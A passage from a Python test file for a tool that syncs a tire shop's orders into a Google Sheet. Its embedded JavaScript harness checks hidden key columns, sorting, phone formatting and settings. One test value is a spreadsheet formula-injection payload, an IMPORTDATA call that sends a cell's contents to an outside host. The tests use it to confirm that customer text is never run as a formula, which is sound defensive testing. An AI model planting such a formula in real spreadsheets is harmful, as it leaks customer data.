  f['Кол-во'] = 4; f['Списание'] = false; f['Примечание'] = '=IMPORTDATA("https://x/?"&B2)'; f['Этап'] = 'Заказ оформлен';
  return f;
}
var out = {};
out.ping = post({secret: SECRET, sheet: 'Заказы', ping: true, columns: COLS.concat(['Нет такой'])});
out.wrong = post({secret: 'другой', sheet: 'Заказы', rows: []});
out.create = post({secret: SECRET, sheet: 'Заказы', rows: [
  {key: 'tires:1:1', create: true, fields: fields('111', 'Шина 111', 'Яна')},
  {key: 'tires:1:2', create: true, fields: fields('222', 'Шина 222', 'Алла')}]});
out.again = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: true, fields: fields('111', 'Шина 111', 'Яна')}]});
out.rowsAfterCreate = sheet.cells.length;
var kc = sheet.cells[0].indexOf('tires_id') + 1;                       // added by the script at the end, hidden (the owner 2026-11-01)
out.at = {one: sheet.get(6, kc), two: sheet.get(7, kc), keyAt: kc, last: kc === sheet.cells[0].length, hidden: sheet.hidden || [],
          notes: Object.keys(sheet.notes).filter(function (k) { return String(sheet.notes[k]).indexOf('tires:') === 0; }).length};
out.text = {phone: sheet.raw['6,' + col['Телефон']], note: sheet.get(6, col['Примечание']), qty: sheet.raw['6,' + col['Кол-во']],
            day: sheet.get(6, col['Дата счета']) instanceof Date ? sheet.get(6, col['Дата счета']).getHours() : null, fmt: sheet.formats['6,' + col['Дата счета']],
            box: sheet.valid['6,' + col['Списание']] || null, manual: sheet.get(2, col['Имя'])};
out.kept = {total: sheet.get(3, col['Комментарий владельца']), sum: sheet.formulas['3,' + col['Сумма продажи']], empty: sheet.formulas['4,' + col['Прибыль ₽']],
            name3: sheet.get(3, col['Имя']), name4: sheet.get(4, col['Имя']), note5: sheet.get(5, col['Примечание']), name5: sheet.get(5, col['Имя'])};
sheet.sortBy(col['Имя'], false);                                          // Алла, Ручная строка, Яна
out.update = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: false, fields: {'Этап': 'На точке, ждём клиента'}, check: {'Артикул': '111'}}]});
out.afterSort = {};
for (var r = 2; r <= sheet.cells.length; r++) if (sheet.get(r, col['Имя'])) out.afterSort[sheet.get(r, col['Имя'])] = sheet.get(r, col['Этап']);
var alla = sheet.keyAt('tires:1:2');                                      // the mark moved with its row (the sort above)
out.allaName = sheet.get(Number(alla), col['Имя']);
sheet.set(Number(alla), col['Артикул'], "'333");                         // the owner rewrote the row
out.rewritten = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:2', create: false, fields: {'Этап': 'Выполнено'}, check: {'Артикул': '222'}}]});
out.allaStage = sheet.get(Number(alla), col['Этап']);
out.gone = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:9:9', create: false, fields: {'Этап': 'x'}, check: {'Артикул': '1'}}]});
out.lacking = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: false, fields: {'Нет такой': 1}}]});
out.manualAfter = [];                                                     // the owner's column after everything: only his «Итого»
for (var r2 = 2; r2 <= sheet.cells.length; r2++) if (sheet.get(r2, col['Комментарий владельца']) !== '') out.manualAfter.push(sheet.get(r2, col['Комментарий владельца']));
out.second = post({secret: SECRET, sheet: 'Второй', rows: [{key: 'tires:2:1', create: true, fields: fields('111', 'Шина 111', 'Ян')}]});
out.secondAt = {formula: second.formulas['2,' + col['Прибыль ₽']], at: second.keyAt('tires:2:1')};
var old = new Sheet(['Дата'].concat(COLS), 6);                             // a sheet of before: the marks in the notes of «Дата»
var oc = {}; old.cells[0].forEach(function (n, i) { oc[n] = i + 1; });      // and of «Дата счета», a note of the owner beside them
old.set(2, oc['Артикул'], "'777"); old.notes['2,' + oc['Дата']] = 'tires:5:1';
old.set(3, oc['Артикул'], "'888"); old.notes['3,' + oc['Дата счета']] = 'tires:5:2'; old.notes['3,' + oc['Дата']] = 'своё примечание';
Book.getSheetByName = function (n) { return n === 'Заказы' ? sheet : n === 'Второй' ? second : n === 'Старый' ? old : null; };
out.oldPing = post({secret: SECRET, sheet: 'Старый', ping: true, columns: COLS});
var okc = old.cells[0].indexOf('tires_id') + 1;
out.oldMarks = {two: old.get(2, okc), three: old.get(3, okc), hidden: old.hidden || [], last: okc === old.cells[0].length,
                note2: old.notes['2,' + oc['Дата']] || '', note3: old.notes['3,' + oc['Дата счета']] || '', own: old.notes['3,' + oc['Дата']]};
out.oldPingAgain = post({secret: SECRET, sheet: 'Старый', ping: true, columns: COLS});
old.notes['2,' + oc['Дата счета']] = 'tires:9:9';                            // a mark that is not this row's: left alone, said
old.notes['2,' + oc['Дата']] = 'tires:5:1';                                 // the same mark again: only the note goes
old.set(4, okc, 12345);                                                     // a number the owner typed into «tires_id» by hand
old.filterTo = okc - 1;                                                      // and a filter made before the column
out.oldPingOdd = post({secret: SECRET, sheet: 'Старый', ping: true, columns: COLS});
out.handTyped = typeof old.get(4, okc);
old.filterTo = okc;
out.filterCovers = post({secret: SECRET, sheet: 'Старый', ping: true, columns: COLS}).filter_outside;
out.oddNotes = {other: old.notes['2,' + oc['Дата счета']], same: old.notes['2,' + oc['Дата']] || '', key: old.get(2, okc)};
out.oldUpdate = post({secret: SECRET, sheet: 'Старый', rows: [{key: 'tires:5:1', create: false, fields: {'Телефон': '89811724133', '№ заказа MIM': '05300825'},
                                                              check: {'Артикул': '777'}}]});
out.oldAfter = {phone: old.raw['2,' + oc['Телефон']], phoneType: typeof old.get(2, oc['Телефон']), phoneFmt: old.formats['2,' + oc['Телефон']],
                number: old.get(2, oc['№ заказа MIM'])};
var ours = String(sheet.keyAt('tires:1:1'));
sheet.formats[ours + ',' + col['№ заказа MIM']] = '';
sheet.set(Number(ours), col['№ заказа MIM'], "'5300825");                    // written by the old script: «'5300825»
sheet.set(Number(ours), col['Кол-во'], 4);
sheet.raw['2,' + col['Имя']] = "'Ручная строка";
out.removed = removeApostrophes();
out.cleaned = {number: sheet.raw[ours + ',' + col['№ заказа MIM']], fmt: sheet.formats[ours + ',' + col['№ заказа MIM']],
               qty: sheet.raw[ours + ',' + col['Кол-во']], qtyFmt: sheet.formats[ours + ',' + col['Кол-во']] || '',
               manual: sheet.raw['2,' + col['Имя']], box: sheet.get(Number(ours), col['Списание'])};
out.keyUntouched = sheet.get(Number(ours), kc) === 'tires:1:1';
// two rows of one code, different phones; a sort that left their marks behind swaps the rows under them (the lead's review)
function same555(phone) { var f = fields('555', 'Шина 555', 'Клиент'); f['Телефон'] = phone; return f; }
post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:3:1', create: true, fields: same555('89000000001')},
                                             {key: 'tires:3:2', create: true, fields: same555('89000000002')}]});
var r1 = sheet.keyAt('tires:3:1'), r2 = sheet.keyAt('tires:3:2');
sheet.set(r1, kc, 'tires:3:2'); sheet.set(r2, kc, 'tires:3:1');
out.swapped = post({secret: SECRET, sheet: 'Заказы', rows: [
  {key: 'tires:3:1', create: false, fields: {'Этап': 'Выполнено'}, check: {'Артикул': '555', 'Телефон': '89000000001'}}]});
out.swappedStage = [sheet.get(r1, col['Этап']), sheet.get(r2, col['Этап'])];
// «tires_id» renamed after it was made: an error, never a new empty column
sheet.set(1, kc, 'метки');
var width = sheet.cells[0].length;
out.renamed = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: false, fields: {'Этап': 'x'}, check: {'Артикул': '111'}}]});
out.renamedPing = post({secret: SECRET, sheet: 'Заказы', ping: true, columns: COLS});
out.noNewColumn = sheet.cells[0].length === width;
sheet.set(1, kc, 'tires_id');
// the owner 2026-11-02: a row out when its order went back (checked first), «extra» only where the sheet has the column
out.optionalPing = post({secret: SECRET, sheet: 'Заказы', ping: true, columns: COLS.concat(['Нет такой']), optional: ['Нет такой']});
function acc(art) { var f = fields(art, 'Шина ' + art, 'Ника'); delete f['Аккаунт']; return f; }
var made = post({secret: SECRET, sheet: 'Заказы', rows: [
  {key: 'tires:7:1', create: true, fields: acc('701'), extra: {'Аккаунт': 'Павел', 'Нет такой': 'x'}},
  {key: 'tires:7:2', create: true, fields: acc('702')}]});
out.extra = {results: made.results, account: sheet.get(sheet.keyAt('tires:7:1'), col['Аккаунт'])};
function bg(key) { var at = sheet.keyAt(key), w = sheet.width(), out = []; for (var j = 1; j <= w; j++) out.push((sheet.bg || {})[at + ',' + j]); return out; }
out.greyed = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:7:1', create: false, fields: {'Этап': 'Новый заказ'}, shade: true,
                                                          check: {'Артикул': '701', 'Телефон': '+7 911 111-22-33'}}]});
out.greyRow = bg('tires:7:1');
out.otherRow = bg('tires:7:2');
out.cleared = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:7:1', create: false, fields: {}, shade: false, check: {'Артикул': '701'}}]});
out.clearedRow = bg('tires:7:1');
out.rewrittenShade = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:7:2', create: false, fields: {}, shade: true, check: {'Артикул': 'другой'}}]});
out.rewrittenRow = bg('tires:7:2');
out.selfTest = selfTest();
out.probes = probes.length === 2 && probes[1] === 'deleted';
console.log(JSON.stringify(out));
"""


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_script_on_a_fake_of_google_sheets(tmp_path):
    path = tmp_path / "run.js"
    path.write_text(HARNESS % {"columns": json.dumps(list(sheet.COLUMNS), ensure_ascii=False), "script": script_text()}, encoding="utf-8")
    done = subprocess.run(["node", str(path)], capture_output=True, text=True)
    assert done.returncode == 0, done.stderr
    out = json.loads(done.stdout)
    assert out["ping"] == {"ok": True, "missing": ["Нет такой"], "moved": 0, "marked": 0, "blocked": 0, "filter_outside": False, "optional": True} and out["wrong"] == {"ok": False, "error": "неверный секрет"}
    assert out["create"]["results"] == [{"key": "tires:1:1", "status": "created"}, {"key": "tires:1:2", "status": "created"}]
    assert out["again"]["results"] == [{"key": "tires:1:1", "status": "updated"}] and out["rowsAfterCreate"] == 7    # no double row
    at = out["at"]                                                          # under the owner's rows «Итого» and the formula, over the checkbox
    assert (at["one"], at["two"], at["last"], at["notes"]) == ("tires:1:1", "tires:1:2", True, 0) and at["hidden"] == [at["keyAt"]]
    assert out["kept"] == {"total": "Итого", "sum": "=SUM(K2:K2)", "empty": '=IF(K4="";"";K4)', "name3": "", "name4": "", "note5": "Заберут 02/08", "name5": ""}
    assert out["text"] == {"phone": "+7 911 111-22-33", "note": '=IMPORTDATA("https://x/?"&B2)', "qty": 4, "day": 12, "fmt": "dd.mm.yyyy",
                           "box": "checkbox", "manual": "Ручная строка"}             # text as text: a formula of a client never runs (only
                                                                                 # «=+-@» keep the apostrophe, 2026-11-01)
    assert out["update"]["results"] == [{"key": "tires:1:1", "status": "updated"}]
    assert out["afterSort"] == {"Алла": "Заказ оформлен", "Ручная строка": "", "Яна": "На точке, ждём клиента"}     # sorted: still the right row
    assert out["allaName"] == "Алла"                                          # the hidden mark went with its row in the sort
    assert out["rewritten"]["results"] == [{"key": "tires:1:2", "status": "missing"}] and out["allaStage"] == "Заказ оформлен"
    assert out["gone"]["results"] == [{"key": "tires:9:9", "status": "missing"}]
    assert out["second"]["results"] == [{"key": "tires:2:1", "status": "created"}]
    assert out["secondAt"] == {"formula": '=IF(K2="";"";K2)', "at": 3}                                             # under the formula, not on it
    assert out["lacking"]["results"][0]["status"] == "error" and out["manualAfter"] == ["Итого"]
    # the owner 2026-11-01: the marks go from the notes into the hidden «tires_id» and the notes with a mark go; a note of the owner stays
    assert out["oldPing"] == {"ok": True, "missing": [], "moved": 2, "marked": 2, "blocked": 0, "filter_outside": False, "optional": True}
    assert out["oldMarks"] == {"two": "tires:5:1", "three": "tires:5:2", "hidden": [len(sheet.COLUMNS) + 2], "last": True,
                               "note2": "", "note3": "", "own": "своё примечание"}
    assert out["oldPingAgain"] == {"ok": True, "missing": [], "moved": 0, "marked": 2, "blocked": 0, "filter_outside": False, "optional": True}   # again
    assert out["oldPingOdd"] == {"ok": True, "missing": [], "moved": 0, "marked": 2, "blocked": 1, "filter_outside": True, "optional": True}
    assert out["handTyped"] == "number" and out["filterCovers"] is False                 # only the changed cells of «tires_id» are written
    assert out["oddNotes"] == {"other": "tires:9:9", "same": "", "key": "tires:5:1"}                     # another mark: left; the same: gone
    assert out["oldUpdate"]["results"] == [{"key": "tires:5:1", "status": "updated"}]                     # an old row is still found
    assert out["oldAfter"] == {"phone": "89811724133",
                               "phoneType": "string", "phoneFmt": "@", "number": "05300825"}            # text stays text, the zero stays
    assert out["selfTest"] == "OK: текст пишется как текст, без апострофа." and out["probes"]                # the temporary sheet is gone
    assert out["keyUntouched"]                                                                              # removeApostrophes skips «tires_id»
    assert out["swapped"]["results"] == [{"key": "tires:3:1", "status": "missing"}]                      # the other phone: not written
    assert out["swappedStage"] == ["Заказ оформлен", "Заказ оформлен"]
    assert out["renamed"] == {"ok": False, "error": "нет колонки «tires_id» — восстановите её (Файл → История версий) или напишите разработчику"}
    assert out["optionalPing"]["missing"] == ["Нет такой"] and out["optionalPing"]["marked"] > 0     # an optional one: the marks looked at
    assert out["extra"] == {"results": [{"key": "tires:7:1", "status": "created"}, {"key": "tires:7:2", "status": "created"}], "account": "Павел"}
    assert out["greyed"]["results"] == [{"key": "tires:7:1", "status": "updated", "shade": True}]     # the whole width of the sheet, nothing else
    assert out["greyRow"] == ["#d9d9d9"] * len(out["greyRow"]) and len(out["greyRow"]) == len(sheet.COLUMNS) + 2 and set(out["otherRow"]) == {None}
    assert out["cleared"]["results"] == [{"key": "tires:7:1", "status": "updated", "shade": False}] and set(out["clearedRow"]) == {None}
    assert out["rewrittenShade"]["results"] == [{"key": "tires:7:2", "status": "missing"}] and set(out["rewrittenRow"]) == {None}
    assert out["renamedPing"]["ok"] is False and out["noNewColumn"]
    assert out["removed"] >= 1 and out["cleaned"]["number"] == "5300825" and out["cleaned"]["fmt"] == "@"
    assert out["cleaned"]["qty"] == 4 and out["cleaned"]["qtyFmt"] == "" and out["cleaned"]["manual"] == "'Ручная строка"   # a number and


# ---- the owner's answers of 2026-10-30 (evening) ------------------------------------------------------------------------------------

def test_a_sheet_without_the_note_column_still_takes_the_rows_and_the_invoice_day_stays_asked(table):
    """«Примечание» is never filled (the owner 2026-10-30) and may go; «Дата счета» is one of the panel's columns: «Проверить» asks for
    it. The hidden «tires_id» (the script's KEY_COLUMN) is never asked: the script adds it by itself (the owner 2026-11-01)."""
    assert "tires_id" not in sheet.ASKED and "tires_id" not in sheet.COLUMNS
    conn, box, fake = table
    fake.columns = [c for c in sheet.COLUMNS if c != "Дата счета"]
    with pytest.raises(sheet.SheetError, match="нет колонок: Дата счета"):
        sheet.check(conn, box, fake)
    fake.columns = [c for c in sheet.COLUMNS if c != "Примечание"]
    fake.marks = {"moved": 12, "marked": 40, "blocked": 0}                # «Проверить» moved the marks of «Дата» (the owner 2026-11-01)
    said = sheet.check(conn, box, fake)
    assert said.endswith("Строк с меткой (скрытая колонка «tires_id»): 40, перенесено сейчас из примечаний: 12, не перенесено: 0.")
    assert "пока не удаляйте" not in said
    fake.marks = {"moved": 0, "marked": 40, "blocked": 0, "filter_outside": True}     # a filter made before «tires_id»
    assert "Фильтр на листе не включает скрытую колонку «tires_id»: удалите фильтр и создайте заново" in sheet.check(conn, box, fake)
    fake.marks = {"moved": 0, "marked": 38, "blocked": 2}                 # two notes with a mark of another row
    assert "не перенесено: 2. У 2 строк метка в примечании расходится с колонкой «tires_id»" in sheet.check(conn, box, fake)
    fake.marks = {}
    mine = placed(conn, comment="Позвонить вечером")
    assert sheet.check(conn, box, fake) == "Таблица отвечает: лист «Заказы», все колонки на месте."
    assert mine in sheet.flush(conn, box, fake, NOW)
    assert not any(r.get("status") == "error" for r in (fake.result or {}).get("results", []))
    assert len(fake.rows) == 2 and all("Примечание" not in r and "Дата" not in r for r in fake.rows.values())


@pytest.mark.parametrize("typed, shown", [("+7 911 128-06-06", "89111280606"), ("8 (911) 128 06 06", "89111280606"), ("", "")])
def test_the_phone_in_the_sheet_is_eight_and_ten_digits(typed, shown):
    assert sheet.sheet_phone(typed) == shown


def test_the_list_of_orders_keeps_the_comment_and_its_own_phone(table):
    """«Список» of the panel shows what it showed (the comment as «Примечание»): only what goes to Google changed."""
    conn, box, fake = table
    mine = placed(conn, comment="Хочу сегодня")
    [row] = list(sheet.card_rows(conn, orders.get_card(conn, mine), NOW).values())[:1]
    assert row["Примечание"] == "Хочу сегодня" and row["Телефон"] == "+7 911 111-22-33"


def test_switched_on_is_shown_in_moscow_time(panel):
    """«Включено с» is kept in UTC (the panel's clock) and shown in Moscow time (the orders are in Moscow time): 12:00 UTC → 15:00."""
    app, conn, box, fake, client = panel
    client.post("/connections/sheet", data={"csrf": "tok", "url": URL, "secret": SECRET, "enabled": "1"})
    assert sheet.settings(conn)["since"] == "2026-10-07T12:00:00"
    assert "07.10.2026 15:00:00 по Москве" in client.get("/connections/sheet").get_data(as_text=True)


# ---- sheet-enroll --open (the owner 2026-10-30): the open orders placed before the table was on ----------------------------------------

def test_the_open_orders_placed_before_the_table_join_its_queue_and_the_closed_do_not(tmp_path, capsys):
    from tires_sync import cli
    conn = db(tmp_path)
    before = {code: placed(conn) for code in ("placed", "moving", "at_point", "oth", "return_given", "done", "cancel")}
    for code, cid in before.items():
        conn.execute("UPDATE order_card SET stage_id = ? WHERE id = ?", (stage(conn, code)["id"], cid))
    early = card(conn)                                                                   # «Новый заказ»: not placed, not for the table
    conn.commit()
    path = str(tmp_path / "t.db")
    assert cli.main(["sheet-enroll", "--db", path, "--open"]) == 1                       # the table is off: nothing
    assert "выключена" in capsys.readouterr().err
    turn_on(conn, SecretBox(Fernet.generate_key()))
    assert cli.main(["sheet-enroll", "--db", path, "--open", "--dry-run"]) == 0
    out = capsys.readouterr().out
    wanted = [before[c] for c in ("placed", "moving", "at_point", "oth", "return_given")]
    assert all("№%d ·" % c in out for c in wanted) and "№%d ·" % before["done"] not in out and "№%d ·" % early not in out
    assert conn.execute("SELECT COUNT(*) FROM sheet_order").fetchone()[0] == 0           # --dry-run: nothing put in
    assert cli.main(["sheet-enroll", "--db", path, "--open"]) == 0
    assert sorted(r[0] for r in conn.execute("SELECT order_id FROM sheet_order")) == sorted(wanted)
    assert cli.main(["sheet-enroll", "--db", path, "--open"]) == 0 and "в очередь Google-таблицы: 0" in capsys.readouterr().out   # twice: nothing more


def test_the_line_of_a_merged_order_already_told_is_information_not_an_error():
    from tires_sync import order_placed
    from tires_sync.panel.routes_orders import placed_kind
    assert placed_kind(order_placed.MERGED) == "info"
    assert placed_kind("Клиенту отправлено «Клиенту: заказ оформлен»") == "ok"
    assert placed_kind("Клиенту не отправлено «Клиенту: заказ оформлен»: нет чата") == "error"


# ---- «Вести заказы, оформленные с» (the owner 2026-11-01: «старые не надо») ----------------------------------------------------------

def test_an_order_before_the_day_is_never_sent_nor_said_and_one_after_goes_as_before(table):
    conn, box, fake = table
    old = placed(conn)                                                     # queued at NOW (2026-10-23)
    sheet.flush(conn, box, fake, NOW)
    assert len(fake.rows) == 2
    fake.rows.clear()                                                      # the owner removed the old rows from the sheet
    sheet.save_settings(conn, URL, True, LATER, "owner", keep_from="2026-11-01")
    before = len(events(conn, old))
    posts = len(fake.posts)
    orders.move_card(conn, old, stage(conn, "at_point")["id"], LATER, "pavel")          # a change of the old order
    assert sheet.flush(conn, box, fake, LATER) == {} and sheet.flush(conn, box, fake, LATER, full=True) == {}
    assert len(fake.posts) == posts and len(events(conn, old)) == before                 # nothing sent, no «изменена или удалена вручную»
    assert conn.execute("SELECT COUNT(*) FROM sheet_order WHERE order_id = ?", (old,)).fetchone()[0] == 1   # its row of the queue stays
    new = card(conn, client_phone="+7 911 555-44-33")
    orders.move_card(conn, new, stage(conn, "placed")["id"], "2026-11-01T10:00:00", "owner")
    assert new in sheet.flush(conn, box, fake, "2026-11-01T10:00:00")
    assert len(fake.rows) == 2 and any("Записано в Google-таблицу" in e for e in events(conn, new))


def test_the_day_never_touches_enabled_since_and_empty_is_every_order(table):
    conn, box, fake = table
    s = sheet.settings(conn)
    assert s["keep_from"] == "" and s["enabled"] and s["since"] == NOW               # the default: every queued order, as before
    sheet.save_settings(conn, URL, True, LATER, "owner", keep_from="2026-11-01")
    after = sheet.settings(conn)
    assert after["keep_from"] == "2026-11-01" and after["since"] == NOW and after["enabled"] and after["secret_for"] == URL
    sheet.save_settings(conn, URL, True, LATER, "owner")                              # a save without the field keeps it
    assert sheet.settings(conn)["keep_from"] == "2026-11-01"
    with pytest.raises(sheet.SheetError, match="дата вида"):
        sheet.save_settings(conn, URL, True, LATER, "owner", keep_from="2026-13-40")
    from tires_sync.panel import texts
    detail = json.loads(conn.execute("SELECT detail FROM audit WHERE action = 'sheet_keep_from'").fetchone()[0])
    assert texts.audit_text({"action": "sheet_keep_from", "detail": detail}) == "Google-таблица: вести заказы, оформленные с 2026-11-01 (было всех)"


def test_the_form_keeps_the_day_and_the_switch(panel):
    app, conn, box, fake, client = panel
    client.post("/connections/sheet", data={"csrf": "tok", "url": URL, "secret": SECRET, "enabled": "1"})
    since = sheet.settings(conn)["since"]
    page = client.get("/connections/sheet").get_data(as_text=True)
    assert 'name="keep_from" value="%s"' % since[:10] in page                     # the day it was switched on, until set
    client.post("/connections/sheet", data={"csrf": "tok", "url": URL, "secret": "", "enabled": "1", "keep_from": "2026-11-01"})
    s = sheet.settings(conn)
    assert s["keep_from"] == "2026-11-01" and s["since"] == since and s["enabled"]
    client.post("/connections/sheet", data={"csrf": "tok", "url": URL, "secret": "", "enabled": "1", "keep_from": "вчера"})
    assert sheet.settings(conn)["keep_from"] == "2026-11-01"                         # a wrong day is not saved
